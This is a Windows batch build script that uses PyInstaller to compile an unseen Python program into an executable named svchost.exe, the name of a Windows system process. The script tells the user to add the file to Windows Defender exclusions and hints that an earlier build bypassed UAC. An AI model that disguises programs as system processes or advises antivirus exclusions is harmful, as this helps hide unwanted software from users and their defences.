@echo off
REM Rebuild svchost.exe with proper admin permissions
REM This fixes the "Windows cannot access" error

echo ========================================
echo Rebuilding svchost.exe with proper UAC settings
echo ========================================
echo.

REM Check if running as admin
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    echo ERROR: Please run this script as Administrator!
    echo Right-click this file and select "Run as administrator"
    pause
    exit /b 1
)

echo [1/4] Cleaning previous build...
if exist build rmdir /s /q build
if exist dist\svchost.exe del /f /q dist\svchost.exe
echo Done!
echo.

echo [2/4] Installing/updating PyInstaller...
python -m pip install --upgrade pyinstaller
echo Done!
echo.

echo [3/4] Building svchost.exe...
python -m PyInstaller svchost.spec --clean
echo Done!
echo.

echo [4/4] Checking output...
if exist dist\svchost.exe (
    echo.
    echo ========================================
    echo SUCCESS! svchost.exe built successfully
    echo ========================================
    echo.
    echo Location: %CD%\dist\svchost.exe
    echo.
    echo IMPORTANT:
    echo 1. The exe now requests admin properly (no UAC bypass)
    echo 2. You may need to add it to Windows Defender exclusions
    echo 3. Right-click the exe and "Unblock" it in Properties
    echo.
    echo Opening dist folder...
    explorer dist
) else (
    echo.
    echo ========================================
    echo ERROR: Build failed!
    echo ========================================
    echo.
    echo Check the error messages above.
)

pause
